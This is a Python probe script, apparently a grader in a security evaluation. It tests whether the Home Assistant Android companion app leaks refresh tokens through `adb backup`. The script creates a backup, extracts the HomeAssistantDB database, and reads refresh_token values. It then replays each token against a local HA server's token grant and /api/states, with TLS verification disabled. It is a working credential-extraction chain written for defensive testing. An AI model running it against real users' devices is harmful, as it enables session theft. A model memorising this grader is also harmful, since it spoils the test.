#!/usr/bin/env python3
"""
Probe: home-assistant-android — confidentiality (remote_attacker)

Shall-not enforced:
    RA-X: Refresh tokens or session cookies stored by the companion app shall not be exfiltrable from the device via `adb backup`, world-readable storage, or an exported content provider, AND shall not be functional against HA after exfiltration.

What this detects:
    The Android companion stores HA session fields in the Room `servers`
    table: `ServerSessionInfo` maps `refreshToken` to `refresh_token`, and
    schema 49 declares both `access_token` and `refresh_token` as TEXT columns:
    https://github.com/home-assistant/android/blob/23766ac659446e40af70a76fc9b1fd194a464748/common/src/main/kotlin/io/homeassistant/companion/android/database/server/ServerSessionInfo.kt#L5-L15
    https://github.com/home-assistant/android/blob/23766ac659446e40af70a76fc9b1fd194a464748/common/schemas/io.homeassistant.companion.android.database.AppDatabase/49.json#L969-L1090
    The production app allows backup and includes the database domain:
    https://github.com/home-assistant/android/blob/23766ac659446e40af70a76fc9b1fd194a464748/app/src/main/AndroidManifest.xml#L60-L64
    https://github.com/home-assistant/android/blob/23766ac659446e40af70a76fc9b1fd194a464748/app/src/main/res/xml/backup_rules.xml#L1-L6
    This probe runs `adb backup`, extracts the backed-up Room database,
    reads candidate tokens from `servers`, and counts compromise only if a
    refresh token mints a live access token and that access token can read
    `/api/states`.

What this does NOT detect (scope):
    It does not detect tokens exfiltrated through a different artifact unless
    they are present in the `adb backup` database payload. It treats an absent
    database or absent tokens as secure for this specific exfiltration channel.

Reward-hackability mitigations:
    Token-shaped strings are not enough. A candidate refresh token must
    succeed at HA's documented refresh-token grant and the minted access token
    must authenticate to `/api/states`. The auth docs define the refresh-token
    grant response, and the REST docs say all API calls require a bearer token
    and `/api/states` returns state objects:
    https://developers.home-assistant.io/docs/auth_api/
    https://developers.home-assistant.io/docs/api/rest/

Inputs consumed:
    ADB device with package io.homeassistant.companion.android installed, and
    the HA API at https://localhost:8123.

Output contract:
    Always exits 0. Emits JSON on stdout with key "score":
        score=1  -> system is secure (impact NOT detected)
        score=0  -> system is compromised (impact detected)
    Sub-checks emitted as additional integer keys (1=pass, 0=fail).
    Human-readable PASS/FAIL goes to stderr.
    Infrastructure errors emit {"score": 0, "error": "<reason>"} and still exit 0.
"""

from __future__ import annotations

import hashlib
import io
import json
import sqlite3
import ssl
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.parse
import urllib.request
import zlib
from pathlib import Path
from typing import Any

PACKAGE_NAME = "io.homeassistant.companion.android"
HA_BASE_URL = "https://localhost:8123"
CLIENT_ID = "https://home-assistant.io/android"
BACKUP_TIMEOUT = 90


def log(message: str) -> None:
    print(message, file=sys.stderr)


def emit(result: dict[str, Any]) -> int:
    print(json.dumps(result, sort_keys=True))
    return 0


def stream_digest(value: str | bytes) -> str:
    if isinstance(value, str):
        raw = value.encode("utf-8", errors="replace")
    else:
        raw = value
    digest = hashlib.sha256(raw).hexdigest()[:12]
    return f"len={len(raw)} sha256={digest}"


def token_digest(token: str) -> str:
    digest = hashlib.sha256(token.encode("utf-8")).hexdigest()[:12]
    return f"len={len(token)} sha256={digest}"


def run_command(args: list[str], timeout: int = 10) -> subprocess.CompletedProcess[str]:
    result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    log(
        f"[DEBUG] {' '.join(args[:4])} exit={result.returncode} "
        f"stdout={stream_digest(result.stdout)} stderr={stream_digest(result.stderr)}"
    )
    return result


def adb_device_available() -> bool:
    result = run_command(["adb", "devices"])
    if result.returncode != 0:
        return False
    device_lines = [
        line
        for line in result.stdout.splitlines()[1:]
        if line.strip() and line.split()[-1] == "device"
    ]
    return bool(device_lines)


def app_installed() -> bool:
    result = run_command(["adb", "shell", "pm", "path", PACKAGE_NAME])
    return result.returncode == 0 and result.stdout.strip().startswith("package:")


def create_backup(backup_path: Path) -> None:
    result = run_command(
        [
            "adb",
            "backup",
            "-noapk",
            "-noshared",
            "-f",
            str(backup_path),
            PACKAGE_NAME,
        ],
        timeout=BACKUP_TIMEOUT,
    )
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or "adb backup failed")
    if not backup_path.exists() or backup_path.stat().st_size == 0:
        raise RuntimeError("adb backup did not create a backup file")


def backup_payload(backup_path: Path) -> bytes:
    raw = backup_path.read_bytes()
    if not raw.startswith(b"ANDROID BACKUP\n"):
        raise RuntimeError("backup file is not in Android backup format")
    stream = io.BytesIO(raw)
    magic = stream.readline()
    version = stream.readline().strip()
    compressed = stream.readline().strip()
    encryption = stream.readline().strip()
    if magic != b"ANDROID BACKUP\n" or not version:
        raise RuntimeError("backup header is malformed")
    if encryption != b"none":
        raise RuntimeError("encrypted Android backup is unsupported")
    payload = stream.read()
    if compressed == b"1":
        return zlib.decompress(payload)
    if compressed == b"0":
        return payload
    raise RuntimeError(f"unknown Android backup compression flag {compressed!r}")


def extract_database_files(payload: bytes) -> list[bytes]:
    databases: list[bytes] = []
    if not payload:
        return databases
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:*") as archive:
        for member in archive.getmembers():
            if not member.isfile():
                continue
            name = member.name
            if not (
                name.endswith("/db/HomeAssistantDB")
                or name.endswith("/databases/HomeAssistantDB")
                or name.endswith("HomeAssistantDB")
            ):
                continue
            handle = archive.extractfile(member)
            if handle is None:
                continue
            data = handle.read()
            log(f"[DEBUG] extracted {name} {stream_digest(data)}")
            databases.append(data)
    return databases


def refresh_tokens_from_database(database_bytes: bytes) -> set[str]:
    tokens: set[str] = set()
    with tempfile.TemporaryDirectory() as temp_dir:
        db_path = Path(temp_dir) / "HomeAssistantDB"
        db_path.write_bytes(database_bytes)
        connection = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        try:
            rows = connection.execute(
                "SELECT refresh_token FROM servers WHERE refresh_token IS NOT NULL"
            ).fetchall()
        finally:
            connection.close()
    for (token,) in rows:
        if isinstance(token, str) and token:
            tokens.add(token)
    return tokens


def post_form(path: str, data: dict[str, str]) -> tuple[int, Any]:
    body = urllib.parse.urlencode(data).encode("utf-8")
    request = urllib.request.Request(
        f"{HA_BASE_URL}{path}",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    context = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(request, timeout=10, context=context) as response:
            raw = response.read().decode("utf-8")
            return response.status, json.loads(raw) if raw else None
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8")
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = raw
        return exc.code, parsed
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)


def http_json(path: str, headers: dict[str, str]) -> tuple[int, Any]:
    request = urllib.request.Request(f"{HA_BASE_URL}{path}", headers=headers)
    context = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(request, timeout=10, context=context) as response:
            raw = response.read().decode("utf-8")
            return response.status, json.loads(raw) if raw else None
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8")
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = raw
        return exc.code, parsed
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)


def refresh_token_is_functional(refresh_token: str) -> bool:
    status, payload = post_form(
        "/auth/token",
        {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": CLIENT_ID,
        },
    )
    if status != 200 or not isinstance(payload, dict):
        log(
            f"[DEBUG] refresh grant rejected candidate {token_digest(refresh_token)} "
            f"status={status} payload_type={type(payload).__name__}"
        )
        return False
    access_token = payload.get("access_token")
    if not isinstance(access_token, str) or not access_token:
        return False
    status, states_payload = http_json(
        "/api/states",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    if status == 200 and isinstance(states_payload, list):
        log(
            f"[FAIL] Backed-up refresh token is functional: "
            f"{token_digest(refresh_token)}"
        )
        return True
    log(
        f"[DEBUG] minted access token failed /api/states for "
        f"{token_digest(refresh_token)} status={status}"
    )
    return False


def collect_refresh_tokens() -> set[str]:
    with tempfile.TemporaryDirectory() as temp_dir:
        backup_path = Path(temp_dir) / "ha_companion.ab"
        create_backup(backup_path)
        payload = backup_payload(backup_path)
    databases = extract_database_files(payload)
    tokens: set[str] = set()
    for database in databases:
        try:
            tokens.update(refresh_tokens_from_database(database))
        except sqlite3.Error as exc:
            log(f"[DEBUG] skipped unreadable SQLite candidate: {exc}")
    return tokens


def main() -> int:
    try:
        if not adb_device_available():
            return emit({"score": 0, "error": "no adb device available"})
        if not app_installed():
            return emit({"score": 0, "error": f"{PACKAGE_NAME} is not installed"})

        tokens = collect_refresh_tokens()
        results: dict[str, Any] = {
            "backup_created": 1,
            "backup_payload_checked": 1,
            "functional_refresh_tokens_absent": 1,
            "extracted_refresh_token_count": len(tokens),
        }
        if not tokens:
            log("[PASS] No refresh tokens were present in the adb backup payload")
        compromised_count = 0
        for token in sorted(tokens):
            if refresh_token_is_functional(token):
                compromised_count += 1
        results["functional_refresh_token_count"] = compromised_count
        results["functional_refresh_tokens_absent"] = 0 if compromised_count else 1
        if compromised_count == 0:
            log("[PASS] No backed-up refresh token authenticated against HA")
        results["score"] = 1 if results["functional_refresh_tokens_absent"] == 1 else 0
        return emit(results)
    except FileNotFoundError as exc:
        log(f"[FAIL] Required command is unavailable: {exc.filename}")
        return emit({"score": 0, "error": f"missing command: {exc.filename}"})
    except subprocess.TimeoutExpired:
        log("[FAIL] adb backup timed out")
        return emit({"score": 0, "error": "adb backup timed out"})
    except Exception as exc:
        log(f"[FAIL] RA-X probe error: {exc}")
        return emit({"score": 0, "error": str(exc)})


if __name__ == "__main__":
    sys.exit(main())
